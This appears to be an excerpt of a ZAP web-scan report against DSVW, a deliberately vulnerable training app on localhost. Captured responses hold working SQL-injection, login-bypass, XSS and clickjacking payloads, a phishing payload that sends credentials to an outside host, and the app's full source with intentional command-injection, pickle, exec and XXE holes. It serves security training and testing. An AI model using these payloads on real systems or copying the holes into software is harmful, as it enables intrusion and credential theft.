  5. Risk=Niski, Confidence=Niski (14)

    1. http://127.0.0.1:65412 (14)

      1. Timestamp Disclosure - Unix (14)
        1. GET http://127.0.0.1:65412
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          A timestamp was disclosed by the application/web server - Unix
          Other info

          300000000, which evaluates to: 1979-07-05 06:20:00
          Request
          Request line and header section (197 bytes) 
          GET http://127.0.0.1:65412 HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Pragma: no-cache
Cache-Control: no-cache
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK

<ul>
<li>Blind SQL Injection (<i>boolean</i>) - <a href="?id=2">vulnerable</a>|<a href="/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27" onclick="alert('checking if the first character for admin\'s password is digit \'7\' (true in case of same result(s) as for \'vulnerable\')')">exploit</a>|<a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#boolean-exploitation-technique" target="_blank">info</a></li>
<li>Blind SQL Injection (<i>time</i>) - <a href="?id=2">vulnerable</a>|<a href="/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))" onclick="alert('checking if the second character for admin\'s password is letter \'e\' (true in case of delayed response)')">exploit</a>|<a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#time-delay-exploitation-technique" target="_blank">info</a></li>
<li>UNION SQL Injection - <a href="?id=2">vulnerable</a>|<a href="/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)">exploit</a>|<a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#union-exploitation-technique" target="_blank">info</a></li>
<li>Login Bypass - <a href="/login?username=&amp;password=">vulnerable</a>|<a href="/login?username=admin&amp;password=%27%20OR%20%271%27%20LIKE%20%271">exploit</a>|<a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#classic-sql-injection" target="_blank">info</a></li>
<li>HTTP Parameter Pollution - <a href="/login?username=&amp;password=">vulnerable</a>|<a href="/login?username=admin&amp;password=%27%2F*&amp;password=*%2FOR%2F*&amp;password=*%2F%271%27%2F*&amp;password=*%2FLIKE%2F*&amp;password=*%2F%271">exploit</a>|<a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution" target="_blank">info</a></li>

</html>
          Evidence 
          300000000
          Solution

          Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns.
        2. GET http://127.0.0.1:65412/
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          A timestamp was disclosed by the application/web server - Unix
          Other info

          300000000, which evaluates to: 1979-07-05 06:20:00
          Request
          Request line and header section (335 bytes) 
          GET http://127.0.0.1:65412/ HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:09:48 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/html; charset=utf8
          Response body (12732 bytes) 
          <!DOCTYPE html>

          Evidence 
          300000000
          Solution

          Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns.
        3. GET http://127.0.0.1:65412/?charset=utf8
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          A timestamp was disclosed by the application/web server - Unix
          Other info

          300000000, which evaluates to: 1979-07-05 06:20:00
          Request
          Request line and header section (382 bytes) 
          GET http://127.0.0.1:65412/?charset=utf8 HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:12:34 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/html; charset=utf8
          Response body (12732 bytes)

          Evidence 
          300000000
          Solution

          Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns.
        4. GET http://127.0.0.1:65412/?foobar
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          A timestamp was disclosed by the application/web server - Unix
          Other info

          300000000, which evaluates to: 1979-07-05 06:20:00
          Request
          Request line and header section (376 bytes) 
          GET http://127.0.0.1:65412/?foobar HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0

          HTTP/1.0 200 OK

</head>

<script>function process(data) {alert("Surname(s) from JSON results: " + Object.keys(data).map(function(k) {return data[k]}));}; var index=document.location.hash.indexOf('lang='); if (index != -1) document.write('<div style="position: absolute; top: 5px; right: 5px;">Chosen language: <b>' + decodeURIComponent(document.location.hash.substring(index + 5)) + '</b></div>');</script>

<div style="position: fixed; bottom: 5px; text-align: center; width: 100%;">Powered by <a href="https://github.com/stamparm/DSVW" style="font-weight: bold; text-decoration: none; visited: blue; color: blue" target="_blank">DSVW</a> (v<b>0.2b</b>)</div>

</html>
          Evidence 
          300000000
          Solution

          Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns.
        5. GET http://127.0.0.1:65412/?include=
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          A timestamp was disclosed by the application/web server - Unix
          Other info

          300000000, which evaluates to: 1979-07-05 06:20:00
          Request
          Request line and header section (378 bytes) 
          GET http://127.0.0.1:65412/?include= HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:12:26 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/html; charset=utf8
          Response body (12732 bytes) 
          <!DOCTYPE html>

</html>
          Evidence 
          300000000
          Solution

          Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns.
        6. GET http://127.0.0.1:65412/?path=
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          A timestamp was disclosed by the application/web server - Unix
          Other info

          300000000, which evaluates to: 1979-07-05 06:20:00
          Request
          Request line and header section (375 bytes) 
          GET http://127.0.0.1:65412/?path= HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:11:13 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/html; charset=utf8
          Response body (12732 bytes) 
          <!DOCTYPE html>

</html>
          Evidence 
          300000000
          Solution

          Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns.
        7. GET http://127.0.0.1:65412/?path=dsvw.py
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          A timestamp was disclosed by the application/web server - Unix
          Other info

          300000000, which evaluates to: 1979-07-05 06:20:00
          Request
          Request line and header section (388 bytes) 
          GET http://127.0.0.1:65412/?path=dsvw.py HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/?path=
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (172 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:12:13 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/plain; charset=utf8
          Response body (19978 bytes) 
          #!/usr/bin/env python
import html, http.client, http.server, io, json, os, pickle, random, re, socket, socketserver, sqlite3, string, sys, subprocess, time, traceback, urllib.parse, urllib.request, xml.etree.ElementTree  # Python 3 required
try:
    import lxml.etree
except ImportError:
    print("[!] please install 'python-lxml' to (also) get access to XML vulnerabilities (e.g. '%s')\n" % ("apt-get install python-lxml" if os.name != "nt" else "https://pypi.python.org/pypi/lxml"))

NAME, VERSION, GITHUB, AUTHOR, LICENSE = "Damn Small Vulnerable Web (DSVW) < 100 LoC (Lines of Code)", "0.2b", "https://github.com/stamparm/DSVW", "Miroslav Stampar (@stamparm)", "Unlicense (public domain)"
LISTEN_ADDRESS, LISTEN_PORT = "127.0.0.1", 65412
HTML_PREFIX, HTML_POSTFIX = "<!DOCTYPE html>\n<html>\n<head>\n<style>a {font-weight: bold; text-decoration: none; visited: blue; color: blue;} ul {display: inline-block;} .disabled {text-decoration: line-through; color: gray} .disabled a {visited: gray; color: gray; pointer-events: none; cursor: default} table {border-collapse: collapse; margin: 12px; border: 2px solid black} th, td {border: 1px solid black; padding: 3px} span {font-size: larger; font-weight: bold}</style>\n<title>%s</title>\n</head>\n<body style='font: 12px monospace'>\n<script>function process(data) {alert(\"Surname(s) from JSON results: \" + Object.keys(data).map(function(k) {return data[k]}));}; var index=document.location.hash.indexOf('lang='); if (index != -1) document.write('<div style=\"position: absolute; top: 5px; right: 5px;\">Chosen language: <b>' + decodeURIComponent(document.location.hash.substring(index + 5)) + '</b></div>');</script>\n" % html.escape(NAME), "<div style=\"position: fixed; bottom: 5px; text-align: center; width: 100%%;\">Powered by <a href=\"%s\" style=\"font-weight: bold; text-decoration: none; visited: blue; color: blue\" target=\"_blank\">%s</a> (v<b>%s</b>)</div>\n</body>\n</html>" % (GITHUB, re.search(r"\(([^)]+)", NAME).group(1), VERSION)
USERS_XML = """<?xml version="1.0" encoding="utf-8"?><users><user id="0"><username>admin</username><name>admin</name><surname>admin</surname><password>7en8aiDoh!</password></user><user id="1"><username>dricci</username><name>dian</name><surname>ricci</surname><password>12345</password></user><user id="2"><username>amason</username><name>anthony</name><surname>mason</surname><password>gandalf</password></user><user id="3"><username>svargas</username><name>sandra</name><surname>vargas</surname><password>phest1945</password></user></users>"""

"/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E", "https://owasp.org/www-community/attacks/Denial_of_Service"))

def init():
    global connection
    http.server.HTTPServer.allow_reuse_address = True
    connection = sqlite3.connect(":memory:", isolation_level=None, check_same_thread=False)
    cursor = connection.cursor()
    cursor.execute("CREATE TABLE users(id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, name TEXT, surname TEXT, password TEXT)")
    cursor.executemany("INSERT INTO users(id, username, name, surname, password) VALUES(NULL, ?, ?, ?, ?)", ((_.findtext("username"), _.findtext("name"), _.findtext("surname"), _.findtext("password")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall("user")))
    cursor.execute("CREATE TABLE comments(id INTEGER PRIMARY KEY AUTOINCREMENT, comment TEXT, time TEXT)")

class ReqHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        path, query = self.path.split('?', 1) if '?' in self.path else (self.path, "")
        code, content, params, cursor = http.client.OK, HTML_PREFIX, dict((match.group("parameter"), urllib.parse.unquote(','.join(re.findall(r"(?:\A|[?&])%s=([^&]+)" % match.group("parameter"), query)))) for match in re.finditer(r"((\A|[?&])(?P<parameter>[\w\[\]]+)=)([^&]+)", query)), connection.cursor()
        try:
            if path == '/':
                if "id" in params:
                    cursor.execute("SELECT id, username, name, surname FROM users WHERE id=" + params["id"])
                    content += "<div><span>Result(s):</span></div><table><thead><th>id</th><th>username</th><th>name</th><th>surname</th></thead>%s</table>%s" % ("".join("<tr>%s</tr>" % "".join("<td>%s</td>" % ("-" if _ is None else _) for _ in row) for row in cursor.fetchall()), HTML_POSTFIX)
                elif "v" in params:
                    content += re.sub(r"(v<b>)[^<]+(</b>)", r"\g<1>%s\g<2>" % params["v"], HTML_POSTFIX)
                elif "object" in params:
                    content = str(pickle.loads(params["object"].encode()))
                elif "path" in params:
                    content = (open(os.path.abspath(params["path"]), "rb") if not "://" in params["path"] else urllib.request.urlopen(params["path"])).read().decode()
                elif "domain" in params:
                    content = subprocess.check_output("nslookup " + params["domain"], shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE).decode()
                elif "xml" in params:
                    content = lxml.etree.tostring(lxml.etree.parse(io.BytesIO(params["xml"].encode()), lxml.etree.XMLParser(no_network=False)), pretty_print=True).decode()
                elif "name" in params:
                    found = lxml.etree.parse(io.BytesIO(USERS_XML.encode())).xpath(".//user[name/text()='%s']" % params["name"])
                    content += "<b>Surname:</b> %s%s" % (found[-1].find("surname").text if found else "-", HTML_POSTFIX)
                elif "size" in params:
                    start, _ = time.time(), "<br>".join("#" * int(params["size"]) for _ in range(int(params["size"])))
                    content += "<b>Time required</b> (to 'resize image' to %dx%d): %.6f seconds%s" % (int(params["size"]), int(params["size"]), time.time() - start, HTML_POSTFIX)
                elif "comment" in params or query == "comment=":
                    if "comment" in params:
                        cursor.execute("INSERT INTO comments VALUES(NULL, '%s', '%s')" % (params["comment"], time.ctime()))
                        content += "Thank you for leaving the comment. Please click here <a href=\"/?comment=\">here</a> to see all comments%s" % HTML_POSTFIX
                    else:
                        cursor.execute("SELECT id, comment, time FROM comments")
                        content += "<div><span>Comment(s):</span></div><table><thead><th>id</th><th>comment</th><th>time</th></thead>%s</table>%s" % ("".join("<tr>%s</tr>" % "".join("<td>%s</td>" % ("-" if _ is None else _) for _ in row) for row in cursor.fetchall()), HTML_POSTFIX)
                elif "include" in params:
                    backup, sys.stdout, program, envs = sys.stdout, io.StringIO(), (open(params["include"], "rb") if not "://" in params["include"] else urllib.request.urlopen(params["include"])).read(), {"DOCUMENT_ROOT": os.getcwd(), "HTTP_USER_AGENT": self.headers.get("User-Agent"), "REMOTE_ADDR": self.client_address[0], "REMOTE_PORT": self.client_address[1], "PATH": path, "QUERY_STRING": query}
                    exec(program, envs)
                    content += sys.stdout.getvalue()
                    sys.stdout = backup
                elif "redir" in params:
                    content = content.replace("<head>", "<head><meta http-equiv=\"refresh\" content=\"0; url=%s\"/>" % params["redir"])
                if HTML_PREFIX in content and HTML_POSTFIX not in content:
                    content += "<div><span>Attacks:</span></div>\n<ul>%s\n</ul>\n" % ("".join("\n<li%s>%s - <a href=\"%s\">vulnerable</a>|<a href=\"%s\">exploit</a>|<a href=\"%s\" target=\"_blank\">info</a></li>" % (" class=\"disabled\" title=\"module 'python-lxml' not installed\"" if ("lxml.etree" not in sys.modules and any(_ in case[0].upper() for _ in ("XML", "XPATH"))) else "", case[0], case[1], case[2], case[3]) for case in CASES)).replace("<a href=\"None\">vulnerable</a>|", "<b>-</b>|")
            elif path == "/users.json":
                content = "%s%s%s" % ("" if not "callback" in params else "%s(" % params["callback"], json.dumps(dict((_.findtext("username"), _.findtext("surname")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall("user"))), "" if not "callback" in params else ")")
            elif path == "/login":
                cursor.execute("SELECT * FROM users WHERE username='" + re.sub(r"[^\w]", "", params.get("username", "")) + "' AND password='" + params.get("password", "") + "'")
                content += "Welcome <b>%s</b><meta http-equiv=\"Set-Cookie\" content=\"SESSIONID=%s; path=/\"><meta http-equiv=\"refresh\" content=\"1; url=/\"/>" % (re.sub(r"[^\w]", "", params.get("username", "")), "".join(random.sample(string.ascii_letters + string.digits, 20))) if cursor.fetchall() else "The username and/or password is incorrect<meta http-equiv=\"Set-Cookie\" content=\"SESSIONID=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT\">"
            else:
                code = http.client.NOT_FOUND
        except Exception as ex:
            content = ex.output if isinstance(ex, subprocess.CalledProcessError) else traceback.format_exc()
            code = http.client.INTERNAL_SERVER_ERROR
        finally:
            self.send_response(code)
            self.send_header("Connection", "close")
            self.send_header("X-XSS-Protection", "0")
            self.send_header("Content-Type", "%s%s" % ("text/html" if content.startswith("<!DOCTYPE html>") else "text/plain", "; charset=%s" % params.get("charset", "utf8")))
            self.end_headers()
            self.wfile.write(("%s%s" % (content, HTML_POSTFIX if HTML_PREFIX in content and GITHUB not in content else "")).encode())
            self.wfile.flush()

class ThreadingServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        http.server.HTTPServer.server_bind(self)

if __name__ == "__main__":
    init()
    print("%s #v%s\n by: %s\n\n[i] running HTTP server at 'http://%s:%d'..." % (NAME, VERSION, AUTHOR, LISTEN_ADDRESS, LISTEN_PORT))
    try:
        ThreadingServer((LISTEN_ADDRESS, LISTEN_PORT), ReqHandler).serve_forever()
    except KeyboardInterrupt:
        pass
    except Exception as ex:
        print("[x] exception occurred ('%s')" % ex)
    finally:
        os._exit(0)
          Evidence 
          300000000
          Solution

          Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns.
        8. GET http://127.0.0.1:65412/?redir=

          • OWASP_2017_A03

<ul>
<li>Blind SQL Injection (<i>boolean</i>) - <a href="?id=2">vulnerable</a>|<a href="/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27" onclick="alert('checking if the first character for admin\'s password is digit \'7\' (true in case of same result(s) as for \'vulnerable\')')">exploit</a>|<a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#boolean-exploitation-technique" target="_blank">info</a></li>

          Evidence 
          300000000
          Solution

          Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns.
        10. GET http://127.0.0.1:65412/?v=0.2
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          A timestamp was disclosed by the application/web server - Unix
          Other info

          300000000, which evaluates to: 1979-07-05 06:20:00
          Request
          Request line and header section (375 bytes) 
          GET http://127.0.0.1:65412/?v=0.2 HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:10:34 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/html; charset=utf8
          Response body (12731 bytes) 
          <!DOCTYPE html>
<html>
<head>

<title>Damn Small Vulnerable Web (DSVW) &lt; 100 LoC (Lines of Code)</title>
</head>

          Evidence 
          300000000
          Solution

          Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns.
        11. GET http://127.0.0.1:65412/?v=0.2%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27http%3A%2F%2Fdsvw.c1.biz%2F%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          A timestamp was disclosed by the application/web server - Unix
          Other info

          300000000, which evaluates to: 1979-07-05 06:20:00
          Request
          Request line and header section (719 bytes) 
          GET http://127.0.0.1:65412/?v=0.2%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27http%3A%2F%2Fdsvw.c1.biz%2F%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:11:44 GMT

Content-Type: text/html; charset=utf8
          Response body (12969 bytes)

          Evidence 
          300000000
          Solution

          Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns.
        12. GET http://127.0.0.1:65412/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fdsvw.c1.biz%2F%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E

          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          A timestamp was disclosed by the application/web server - Unix

          Evidence 
          300000000
          Solution

          Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns.
        14. GET http://127.0.0.1:65412/?v=0.2%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          A timestamp was disclosed by the application/web server - Unix
          Other info

          300000000, which evaluates to: 1979-07-05 06:20:00
          Request
          Request line and header section (437 bytes) 
          GET http://127.0.0.1:65412/?v=0.2%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:10:37 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/html; charset=utf8
          Response body (12777 bytes) 
          <!DOCTYPE html>
<html>
<head>

          Evidence 
          300000000
          Solution

          Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns.

  6. Risk=Informacyjny, Confidence=Średni (6)

    1. http://127.0.0.1:65412 (6)

      1. Information Disclosure - Sensitive Information in URL (6)
        1. GET http://127.0.0.1:65412/login?username=&password=
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          The request appeared to contain sensitive information leaked in the URL. This can violate PCI and most organizational compliance policies. You can configure the list of strings for this check to add or remove values specific to your environment.
          Other info

          The URL contains potentially sensitive information. The following string was found via the pattern: pass

          password
          Request
          Request line and header section (394 bytes) 
          GET http://127.0.0.1:65412/login?username=&password= HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:10:18 GMT
Connection: close
X-XSS-Protection: 0

          Solution

          Do not pass sensitive information in URIs.
        6. GET http://127.0.0.1:65412/login?username=admin&password=%27%2F*&password=*%2FOR%2F*&password=*%2F%271%27%2F*&password=*%2FLIKE%2F*&password=*%2F%271
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          The request appeared to contain sensitive information leaked in the URL. This can violate PCI and most organizational compliance policies. You can configure the list of strings for this check to add or remove values specific to your environment.
          Other info

          The URL contains potentially sensitive information. The following string was found via the pattern: user

          username

          Parameter 
          username
          Evidence 
          username
          Solution

          Do not pass sensitive information in URIs.

  7. Risk=Informacyjny, Confidence=Niski (28)

    1. http://127.0.0.1:65412 (28)

      1. Information Disclosure - Suspicious Comments (28)
        1. GET http://127.0.0.1:65412
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          The response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.
          Other info

          The following pattern was used: \bFROM\b and was detected in the element starting with: "<script>function process(data) {alert("Surname(s) from JSON results: " + Object.keys(data).map(function(k) {return data[k]}));};", see evidence field for the suspicious comment/snippet.

          Solution

          Remove all comments that return information that may help an attacker and fix any underlying problems they refer to.
        2. GET http://127.0.0.1:65412/
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          The response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.
          Other info

</html>
          Evidence 
          from
          Solution

          Remove all comments that return information that may help an attacker and fix any underlying problems they refer to.
        3. GET http://127.0.0.1:65412/?charset=utf8
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          The response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.
          Other info

          The following pattern was used: \bFROM\b and was detected in the element starting with: "<script>function process(data) {alert("Surname(s) from JSON results: " + Object.keys(data).map(function(k) {return data[k]}));};", see evidence field for the suspicious comment/snippet.
          Request
          Request line and header section (382 bytes) 
          GET http://127.0.0.1:65412/?charset=utf8 HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
